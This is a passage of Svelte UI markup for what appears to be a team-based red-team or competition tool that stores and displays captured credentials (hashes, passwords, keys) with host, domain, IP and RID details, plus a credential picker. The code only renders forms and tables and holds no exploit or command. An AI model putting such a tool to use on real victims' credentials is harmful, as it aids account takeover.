                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-rose-200/45"
                    placeholder="optional"
                  />
                </label>
              </div>

              <div class="grid min-w-0 gap-3 2xl:grid-cols-2">
                <label class="grid min-w-0 gap-2">
                  <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Host</span>
                  <input
                    bind:value={credentialForm.host}
                    class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-rose-200/45"
                    placeholder="optional"
                  />
                </label>
              </div>

              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">IP</span>
                <input
                  bind:value={credentialForm.ip}
                  class="min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-rose-200/45"
                  placeholder="192.168.1.10"
                />
              </label>

              <label class="grid min-w-0 gap-2">
                <span class="text-xs font-semibold uppercase tracking-[0.2em] text-white/45">Credential</span>
                <textarea
                  bind:value={credentialForm.secret}
                  required
                  class="min-h-24 min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 font-mono text-sm text-white outline-none transition placeholder:text-white/30 focus:border-rose-200/45"
                  placeholder="hash, password, or key material"
                ></textarea>
              </label>

              {#if credentialsError}
                <p class="rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm text-rose-100">{credentialsError}</p>
              {/if}

              <Button type="submit" disabled={credentialBusy || !selectedCredentialTeam} class="bg-rose-200 text-slate-950 hover:bg-rose-100">
                {credentialBusy ? "Adding..." : "Add credential"}
              </Button>
            </form>
          </div>

          <div class="min-w-0 rounded-md border border-white/10 bg-white/[0.035] p-5">
            <div class="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.22em] text-rose-200/60">Credential database</p>
                <h2 class="mt-2 text-xl font-semibold text-white">
                  {selectedCredentialTeam || "No team selected"}
                </h2>
              </div>
              <div class="flex flex-wrap items-center gap-2">
                <div class="rounded-md border border-white/10 bg-black/20 px-3 py-2 text-sm text-white/55">
                  {credentials.length} entries
                </div>
                <button
                  type="button"
                  class="inline-flex items-center gap-2 rounded-md border border-rose-300/20 bg-rose-300/10 px-3 py-2 text-sm font-semibold text-rose-100 transition hover:border-rose-200/45 hover:bg-rose-300/15 disabled:cursor-not-allowed disabled:opacity-60"
                  disabled={!selectedCredentialTeam || credentials.length === 0 || credentialsClearing}
                  onclick={handleClearCredentials}
                >
                  <Trash2 class="h-4 w-4" />
                  {credentialsClearing ? "Clearing..." : "Clear all"}
                </button>
              </div>
            </div>

            <div class="mt-5 overflow-x-auto rounded-md border border-white/10">
              <table class="w-full min-w-[1080px] border-collapse text-left text-sm">
                <thead class="bg-white/[0.045] text-xs uppercase tracking-[0.18em] text-white/45">
                  <tr>
                    <th class="px-3 py-3 font-semibold">OS</th>
                    <th class="px-3 py-3 font-semibold">Username</th>
                    <th class="px-3 py-3 font-semibold">Type</th>
                    <th class="px-3 py-3 font-semibold">RID</th>
                    <th class="px-3 py-3 font-semibold">Credential</th>
                    <th class="px-3 py-3 font-semibold">Domain</th>
                    <th class="px-3 py-3 font-semibold">Host</th>
                    <th class="px-3 py-3 font-semibold">IP</th>
                    <th class="px-3 py-3 font-semibold">Added</th>
                  </tr>
                </thead>
                <tbody class="divide-y divide-white/10">
                  {#if credentialsLoading}
                    <tr>
                      <td class="px-3 py-6 text-white/55" colspan="9">Loading credentials...</td>
                    </tr>
                  {:else if credentials.length === 0}
                    <tr>
                      <td class="px-3 py-6 text-white/55" colspan="9">No credentials for this team yet.</td>
                    </tr>
                  {:else}
                    {#each credentials as credential (credential.id)}
                      <tr class="align-top transition hover:bg-white/[0.035]">
                        <td class="px-3 py-3 capitalize text-white/75">{credential.os}</td>
                        <td class="px-3 py-3 font-medium text-white">{credential.username}</td>
                        <td class="px-3 py-3 text-rose-100">{credential.secretType}</td>
                        <td class="px-3 py-3 font-mono text-xs text-white/50">{credential.rid || "-"}</td>
                        <td class="max-w-[320px] px-3 py-3 font-mono text-xs text-teal-100">
                          <span class="block truncate" title={credential.secret}>{credential.secret}</span>
                        </td>
                        <td class="px-3 py-3 text-white/60">{credential.domain || "-"}</td>
                        <td class="px-3 py-3 text-white/60">{credential.host || "-"}</td>
                        <td class="px-3 py-3 text-white/60">{credential.ip || "-"}</td>
                        <td class="px-3 py-3 text-xs text-white/45">{credential.createdAt}</td>
                      </tr>
                    {/each}
                  {/if}
                </tbody>
              </table>
            </div>
          </div>
        </section>
      {/if}
    </main>

    {#if easyCredentialPickerOpen}
      <div class="fixed inset-0 z-50 grid place-items-center bg-black/70 px-4 py-6">
        <div class="grid max-h-[88vh] w-full max-w-3xl overflow-hidden rounded-md border border-lime-300/20 bg-[#111719]">
          <div class="border-b border-white/10 p-5">
            <div class="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
              <div>
                <p class="text-xs font-semibold uppercase tracking-[0.24em] text-lime-200/60">Credential picker</p>
                <h2 class="mt-2 text-xl font-semibold text-white">Choose a credential</h2>
                <p class="mt-2 text-sm text-white/55">Search, filter, and pick from the newest matching credentials.</p>
              </div>
              <Button
                type="button"
                class="border border-white/10 bg-white/[0.06] text-white hover:bg-white/[0.1]"
                onclick={() => (easyCredentialPickerOpen = false)}
              >
                Close
              </Button>
            </div>

            <div class="mt-4 grid gap-3">
              <input
                bind:value={easyCredentialSearch}
                class="w-full min-w-0 rounded-md border border-white/10 bg-black/30 px-3 py-3 text-sm text-white outline-none transition placeholder:text-white/30 focus:border-lime-200/45"
                placeholder="Search user, domain, RID, host, IP, type, hash suffix"
              />
              <div class="flex flex-wrap gap-2">
                {#each credentialScopeFilters as scope}
                  <button
                    type="button"
                    class={[
                      "rounded-md border px-3 py-2 text-xs font-semibold uppercase tracking-[0.16em] transition",
                      easyCredentialScopeFilter === scope
                        ? "border-lime-200/60 bg-lime-200/15 text-lime-100"
                        : "border-white/10 bg-white/[0.04] text-white/55 hover:border-lime-200/35"
                    ]}
                    onclick={() => (easyCredentialScopeFilter = scope)}
                  >
                    {scope}
                  </button>
                {/each}
              </div>
              <div class="flex flex-wrap gap-2">
                {#each credentialTypeFilters as type}
                  <button
                    type="button"
                    class={[
                      "rounded-md border px-3 py-2 text-xs font-semibold uppercase tracking-[0.16em] transition",
                      easyCredentialTypeFilter === type
                        ? "border-teal-200/60 bg-teal-200/15 text-teal-100"
                        : "border-white/10 bg-white/[0.04] text-white/55 hover:border-teal-200/35"
                    ]}
                    onclick={() => (easyCredentialTypeFilter = type)}
                  >
                    {type}
                  </button>
                {/each}
              </div>
            </div>
          </div>

          <div class="min-h-0 overflow-y-auto p-3">
            {#if filteredEasyCredentialOptions.length === 0}
              <p class="rounded-md border border-white/10 bg-black/20 p-5 text-sm text-white/55">No credentials match those filters.</p>
            {:else}
              <div class="grid gap-2">
                {#each filteredEasyCredentialOptions as credential (credential.id)}
                  <button
                    type="button"
                    class={[
                      "rounded-md border px-3 py-3 text-left transition",
                      easyMode.credentialId === String(credential.id)
                        ? "border-lime-200/60 bg-lime-200/12"
                        : "border-white/10 bg-white/[0.035] hover:border-lime-200/35 hover:bg-lime-200/10"
                    ]}
                    onclick={() => {
                      easyMode = { ...easyMode, credentialId: String(credential.id) };
                      easyCredentialPickerOpen = false;
                    }}
                  >
                    <span class="block truncate font-mono text-sm text-teal-100">{credentialIdentity(credential)}</span>
                    <span class="mt-1 block text-xs text-white/50">
                      {credential.secretType} / {credentialSecretHint(credential)} / added {credentialAddedLabel(credential)}
                    </span>
                    {#if credentialContextLabel(credential)}
                      <span class="mt-1 block text-xs text-white/35">{credentialContextLabel(credential)}</span>
                    {/if}
                  </button>
                {/each}
              </div>
            {/if}
          </div>
        </div>
      </div>
    {/if}

    {#if popupError}
      <div class="fixed inset-0 z-50 grid place-items-center bg-black/70 px-4">
        <div class="w-full max-w-md rounded-md border border-rose-300/25 bg-[#111719] p-5">
          <p class="text-xs font-semibold uppercase tracking-[0.24em] text-rose-200/60">Add team failed</p>
          <h2 class="mt-3 text-xl font-semibold text-white">That team could not be added.</h2>
          <p class="mt-3 whitespace-pre-wrap text-sm leading-6 text-white/65">{popupError}</p>
          <div class="mt-5 flex justify-end">
            <Button class="bg-rose-200 text-slate-950 hover:bg-rose-100" onclick={() => (popupError = "")}>Close</Button>
          </div>
        </div>
      </div>
    {/if}

    <footer class="flex flex-col gap-2 border-t border-white/10 py-4 text-xs text-white/40 sm:flex-row sm:items-center sm:justify-between">
      <span class="flex items-center gap-2"><CircleDot class="h-3 w-3 text-teal-200" /> Static tab workspace</span>
      <span class="flex items-center gap-2"><Activity class="h-3 w-3 text-lime-200" /> Server expected on localhost:8080</span>
    </footer>
  </div>
</div>
